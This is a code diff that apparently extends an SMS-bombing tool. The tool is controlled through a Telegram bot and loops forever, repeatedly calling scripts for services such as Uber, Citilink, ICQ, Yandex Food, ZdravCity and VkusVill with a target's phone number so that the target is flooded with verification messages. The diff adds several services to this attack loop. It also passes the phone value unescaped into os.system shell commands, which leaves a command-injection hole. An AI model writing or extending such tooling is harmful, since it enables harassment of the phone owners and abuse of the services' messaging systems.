@@ -18,7 +18,7 @@ def run_sms(phone, userid):
 
     while True:
 
-        os.system("python3 services/uber.py " + phone)
+        os.system("python3 services/uber.py " + phone[1:-1])
 
         time.sleep(2)
 
@@ -43,6 +43,26 @@ def run_sms(phone, userid):
         time.sleep(2)
 
         os.system("python3 services/sravni.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 services/citilink.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 services/icq.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 services/yandexfood.py " + phone)
+
+        time.sleep(2)
+
+        os.system("python3 services/zdravcity.py " + phone[1:-1])
+
+        time.sleep(2)
+
+        os.system("python3 services/vkusvill.py " + phone)
 
         if not utilities.is_attack_running(userid):
             bot = telebot.TeleBot(config.bot_token)
